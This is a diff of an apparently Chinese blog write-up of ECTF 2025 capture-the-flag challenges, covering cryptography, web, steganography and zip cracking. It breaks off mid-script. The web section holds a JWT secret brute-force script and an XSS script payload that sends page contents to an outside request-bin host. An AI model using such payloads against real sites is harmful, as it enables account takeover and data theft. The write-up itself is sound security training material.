-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decryption</span>(<span class="hljs-params">encrypted_text</span>):<br>    decrypted_chars = []<br>    <span class="hljs-keyword">for</span> i, enc_char <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(encrypted_text):<br>        enc_code = <span class="hljs-built_in">ord</span>(enc_char)<br>        shift = <span class="hljs-number">3</span> * (i + <span class="hljs-number">1</span>) + <span class="hljs-number">67</span><br>        orig_code = (enc_code - shift) % <span class="hljs-number">256</span><br>        decrypted_chars.append(<span class="hljs-built_in">chr</span>(orig_code))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(decrypted_chars)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;VaultKey_encrypted.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    encrypted_text = f.read()<br><br><span class="hljs-built_in">print</span>(decryption(encrypted_text))<br><br><span class="hljs-comment"># Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125;</span><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">def decryption(encrypted_text):
+    decrypted_chars = []
+    for i, enc_char in enumerate(encrypted_text):
+        enc_code = ord(enc_char)
+        shift = 3 * (i + 1) + 67
+        orig_code = (enc_code - shift) % 256
+        decrypted_chars.append(chr(orig_code))
+    return &#39;&#39;.join(decrypted_chars)
 
+with open(&#39;VaultKey_encrypted.txt&#39;, &#39;r&#39;, encoding=&#39;utf-8&#39;, errors=&#39;ignore&#39;) as f:
+    encrypted_text = f.read()
 
+print(decryption(encrypted_text))
 
-
-
+# Well done! I bet you&#39;re great at math. Here&#39;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125;
+</code></pre>
 <h3 id="Never-two-without-three"><a href="#Never-two-without-three" class="headerlink" title="Never two without three"></a>Never two without three</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202230223555.png" alt="image-20250202230223555"></p>
 <p>我们首先会得到这些内容：</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY<br></code></pre></td></tr></table></figure>
-
+<pre><code>AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY
+</code></pre>
 <p>直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> string<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">caesar_cipher_decrypt</span>(<span class="hljs-params">text, shift</span>):<br>    decrypted_text = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> text:<br>        <span class="hljs-keyword">if</span> char <span class="hljs-keyword">in</span> string.ascii_letters:<br>            is_upper = char.isupper()<br>            alphabet = string.ascii_uppercase <span class="hljs-keyword">if</span> is_upper <span class="hljs-keyword">else</span> string.ascii_lowercase<br>            new_index = (alphabet.index(char) - shift) % <span class="hljs-number">26</span><br>            decrypted_text += alphabet[new_index]<br>        <span class="hljs-keyword">else</span>:<br>            decrypted_text += char<br>    <span class="hljs-keyword">return</span> decrypted_text<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">try_base64_decode</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">try</span>:<br>        decoded_data = base64.b64decode(text).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">return</span> decoded_data<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>cipher_text = <span class="hljs-string">&quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;</span><br><br><span class="hljs-keyword">for</span> shift <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">26</span>):<br>    decrypted_text = caesar_cipher_decrypt(cipher_text, shift)<br>    base64_decoded = try_base64_decode(decrypted_text)<br>    <span class="hljs-keyword">if</span> base64_decoded:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Shift: <span class="hljs-subst">&#123;shift&#125;</span>, 解码: <span class="hljs-subst">&#123;base64_decoded&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN</span><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">import base64
+import string
 
+def caesar_cipher_decrypt(text, shift):
+    decrypted_text = &quot;&quot;
+    for char in text:
+        if char in string.ascii_letters:
+            is_upper = char.isupper()
+            alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase
+            new_index = (alphabet.index(char) - shift) % 26
+            decrypted_text += alphabet[new_index]
+        else:
+            decrypted_text += char
+    return decrypted_text
+
+def try_base64_decode(text):
+    try:
+        decoded_data = base64.b64decode(text).decode(&#39;utf-8&#39;)
+        return decoded_data
+    except Exception:
+        return None
+
+cipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;
+
+for shift in range(26):
+    decrypted_text = caesar_cipher_decrypt(cipher_text, shift)
+    base64_decoded = try_base64_decode(decrypted_text)
+    if base64_decoded:
+        print(f&quot;Shift: &#123;shift&#125;, 解码: &#123;base64_decoded&#125;&quot;)
+
+# Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN
+</code></pre>
 <p>发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到：</p>
-<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125;<br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125;
+</code></pre>
 <h2 id="2-Web"><a href="#2-Web" class="headerlink" title="2. Web"></a>2. Web</h2><h3 id="Java-Weak-Token"><a href="#Java-Weak-Token" class="headerlink" title="Java Weak Token"></a>Java Weak Token</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203201915159.png" alt="image-20250203201915159"></p>
 <p>先简单科普一下JWT：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250204135903301.png" alt="image-20250204135903301"></p>
 <p>JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算</p>
-<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">HMACSHA256</span><span class="hljs-params">(base64UrlEncode(header)</span></span> + <span class="hljs-string">&quot;.&quot;</span> +<span class="hljs-built_in">base64UrlEncode</span>(payload),密钥)<br></code></pre></td></tr></table></figure>
-
+<pre><code>HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥)
+</code></pre>
 <p>以确保当前信息的完整性（integrity），真实性（authenticity）。</p>
 <p>在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）：</p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span>.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.<span class="hljs-number">0</span>dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM<br></code></pre></td></tr></table></figure>
-
+<pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM
+</code></pre>
 <p>用 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 分析一下：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203211406069.png" alt="image-20250203211406069"></p>
 <p>可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。</p>
 <p>根据题目的提示，我们先将这个JWT的密钥给爆破出来：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> jwt<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">brute_force_jwt</span>(<span class="hljs-params">token</span>):<br>    <span class="hljs-comment"># header, payload, signature = token.split(&#x27;.&#x27;)</span><br>    <br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;rockyou.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;latin-1&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            secret = line.strip()<br>            <span class="hljs-keyword">try</span>:<br>                decoded = jwt.decode(token, secret, algorithms=[<span class="hljs-string">&#x27;HS256&#x27;</span>])<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Found secret key: <span class="hljs-subst">&#123;secret&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decoded JWT: <span class="hljs-subst">&#123;decoded&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> secret<br>            <span class="hljs-keyword">except</span> jwt.ExpiredSignatureError:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[-] Expired token with key: <span class="hljs-subst">&#123;secret&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> secret<br>            <span class="hljs-keyword">except</span> jwt.InvalidTokenError:<br>                <span class="hljs-keyword">pass</span><br>    <br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] No valid secret found in wordlist.&quot;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br>jwt_token = <span class="hljs-string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;</span><br><br>brute_force_jwt(jwt_token)<br><br><span class="hljs-comment"># [+] Found secret key: 1234</span><br></code></pre></td></tr></table></figure>
+<pre><code class="language-python">import jwt
+import time
 
+def brute_force_jwt(token):
+    # header, payload, signature = token.split(&#39;.&#39;)
+    
+    with open(&quot;rockyou.txt&quot;, &#39;r&#39;, encoding=&#39;latin-1&#39;) as f:
+        for line in f:
+            secret = line.strip()
+            try:
+                decoded = jwt.decode(token, secret, algorithms=[&#39;HS256&#39;])
+                print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;)
+                print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;)
+                return secret
+            except jwt.ExpiredSignatureError:
+                print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;)
+                return secret
+            except jwt.InvalidTokenError:
+                pass
+    
+    print(&quot;[-] No valid secret found in wordlist.&quot;)
+    return None
+
+
+jwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;
+
+brute_force_jwt(jwt_token)
+
+# [+] Found secret key: 1234
+</code></pre>
 <p>用这个网站将我们的JWT的payload改成“admin”</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203212118532.png" alt="image-20250203212118532"></p>
 <p>之后再用这个新的JWT访问网站即可得到flag：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;JwT_T0keN_cR34t0r&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;JwT_T0keN_cR34t0r&#125;
+</code></pre>
 <h3 id="Chat-with-the-admin"><a href="#Chat-with-the-admin" class="headerlink" title="Chat with the admin"></a>Chat with the admin</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203202025574.png" alt="image-20250203202025574"></p>
 <p>这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 <a target="_blank" rel="noopener" href="https://pipedream.com/">https://pipedream.com/</a> 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。），</p>
 <p>然后在对话框里输入以下内容即可：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;http://instances.ectf.fr:11111/&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">response</span> =&gt;</span> response.<span class="hljs-title function_">text</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">text</span> =&gt;</span> <span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;</span>+<span class="hljs-title function_">btoa</span>(<span class="hljs-built_in">encodeURIComponent</span>(text)))&lt;/script&gt;<br></code></pre></td></tr></table></figure>
-
+<pre><code class="language-javascript">&lt;script&gt;fetch(&#39;http://instances.ectf.fr:11111/&#39;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt;
+</code></pre>
 <p>之后便会在Request Bin的访问纪录里查看flag：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ECTF</span><span class="hljs-template-variable">&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125;
+</code></pre>
 <h2 id="3-Steganography（隐写）"><a href="#3-Steganography（隐写）" class="headerlink" title="3. Steganography（隐写）"></a>3. Steganography（隐写）</h2><h3 id="Definitely-not-in-the-PDF"><a href="#Definitely-not-in-the-PDF" class="headerlink" title="Definitely not in the PDF"></a>Definitely not in the PDF</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203213912998.png" alt="image-20250203213912998"></p>
 <p>将下载的压缩包解压会得到一份pdf文件：</p>
 <p><img src="/../../../../CTF-win/%25E6%25AF%2594%25E8%25B5%259B/ECTF%2520(2025.01.24-26)/Stega_-_Definitely_not_in_the_PDF/world_flags.jpg" alt="world_flags"></p>
 <p>并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203214621938.png" alt="image-20250203214621938"></p>
-<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">ECTF&#123;W3lL_d0nE_6526<span class="hljs-number">51663616263</span>&#125;<br></code></pre></td></tr></table></figure>
-
-
-
+<pre><code>ECTF&#123;W3lL_d0nE_652651663616263&#125;
+</code></pre>
 <h3 id="JB1804"><a href="#JB1804" class="headerlink" title="JB1804"></a>JB1804</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203214807229.png" alt="image-20250203214807229"></p>
 <p>我们会得到一份乐谱：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_4_-_JB1804.png" alt="Stega_4_-_JB1804"></p>
@@ -356,8 +498,8 @@
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/B%25C3%25BCcking_Music_Cipher.png" alt="Bücking_Music_Cipher"></p>
 <p>根据这张密码表解码会得到：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/cd0c1240e0a0120e05eb92e3e10f5a7.jpg" alt="cd0c1240e0a0120e05eb92e3e10f5a7"></p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;steganomousiqueissuperswag&#125;</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>ectf&#123;steganomousiqueissuperswag&#125;
+</code></pre>
 <p>(法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。)</p>
 <h3 id="The-island’s-treasure"><a href="#The-island’s-treasure" class="headerlink" title="The island’s treasure"></a>The island’s treasure</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202222812788.png" alt="image-20250202222812788"></p>
 <p>下载文件会得到2张图片：</p>
@@ -366,29 +508,30 @@
 <p>首先用010 Editor打开第一张图片会发现</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202223215134.png" alt="image-20250202223215134"></p>
 <p>在Description后面有一段base64编码</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0=
+</code></pre>
 <p>解码后会得到</p>
-<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM=
+</code></pre>
 <p>再解码一次会得到key1：</p>
-<figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Félicitations ! Tu as trouvé la clé n°<span class="hljs-number">1</span> du coffre !<br>Congratulations ! You found the key n°<span class="hljs-number">1</span> of the chest !<br>Clé: M3t4d4t4_15_n0t_5af3<br>Key: M3t4d4t4_15_n0t_5af3<br></code></pre></td></tr></table></figure>
-
-
-
+<pre><code>Félicitations ! Tu as trouvé la clé n°1 du coffre !
+Congratulations ! You found the key n°1 of the chest !
+Clé: M3t4d4t4_15_n0t_5af3
+Key: M3t4d4t4_15_n0t_5af3
+</code></pre>
 <p>因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202223724687.png" alt="image-20250202223724687"></p>
 <p>我们将这张照片导出会得到第二部分的key（key2）：<br><img src="https://raw.githubusercontent.com/archer-baiyi/Picture/main/solved.bmp" alt="solved"></p>
-<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs makefile"><span class="hljs-section">key1: M3t4d4t4_15_n0t_5af3</span><br><span class="hljs-section">key2: Hidd3n_p1ctur3</span><br>key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3<br></code></pre></td></tr></table></figure>
-
+<pre><code>key1: M3t4d4t4_15_n0t_5af3
+key2: Hidd3n_p1ctur3
+key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3
+</code></pre>
 <p>然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego：<br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202224133450.png" alt="image-20250202224133450"></p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250202224216072.png" alt="image-20250202224216072"></p>
 <p>提取出来的照片为：<br><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/flag.png" alt="flag"></p>
 <p>成功找到flag：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ECTF</span><span class="hljs-template-variable">&#123;You_found_th3_tr3asur3&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
+<pre><code>ECTF&#123;You_found_th3_tr3asur3&#125;
+</code></pre>
 <h3 id="Silhouette-in-cyberpunk"><a href="#Silhouette-in-cyberpunk" class="headerlink" title="Silhouette in cyberpunk"></a>Silhouette in cyberpunk</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203221019589.png" alt="image-20250203221019589"></p>
 <p>这道题我们会得到一张图片：</p>
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_5_-_Silhouette_in_cyberpunk.png" alt="Stega_5_-_Silhouette_in_cyberpunk"></p>
@@ -399,46 +542,163 @@
 <p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/Stega_5_-_Silhouette_in_cyberpunk2.png" alt="Stega_5_-_Silhouette_in_cyberpunk2"></p>
 <p>（画面左边远处的那栋大楼）</p>
 <p>第一张里面的盲文翻译过来是：</p>
-<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">This <span class="hljs-keyword">is</span> just a dummyy, nice <span class="hljs-keyword">try</span><br></code></pre></td></tr></table></figure>
-
+<pre><code>This is just a dummyy, nice try
+</code></pre>
 <p>而第二张里面的内容才是真正的flag：</p>
-<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs clean">⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎<br><br>-&gt;<br><br>h1dd3n1nth3d4rkn3ss<br></code></pre></td></tr></table></figure>
+<pre><code>⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎
 
+-&gt;
+
+h1dd3n1nth3d4rkn3ss
+</code></pre>
 <p>(可以用这个网站翻译盲文内容：<a target="_blank" rel="noopener" href="https://www.dcode.fr/alphabet-braille">https://www.dcode.fr/alphabet-braille</a>)</p>
 <p>根据题目的flag格式要求，我们确定flag为：</p>
-<figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ectf</span><span class="hljs-template-variable">&#123;h1dd3n_1n_th3_d4rkn3ss&#125;</span><br></code></pre></td></tr></table></figure>
-
-
-
-
-
+<pre><code>ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125;
+</code></pre>
 <h2 id="4-Miscellaneous"><a href="#4-Miscellaneous" class="headerlink" title="4. Miscellaneous"></a>4. Miscellaneous</h2><h3 id="Extraction-Mission-Heart-of-the-vault"><a href="#Extraction-Mission-Heart-of-the-vault" class="headerlink" title="Extraction Mission Heart of the vault"></a>Extraction Mission Heart of the vault</h3><p><img src="https://raw.githubusercontent.com/Lycorisby/Picture/main/image-20250203232322334.png" alt="image-20250203232322334"></p>
 <p>这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span 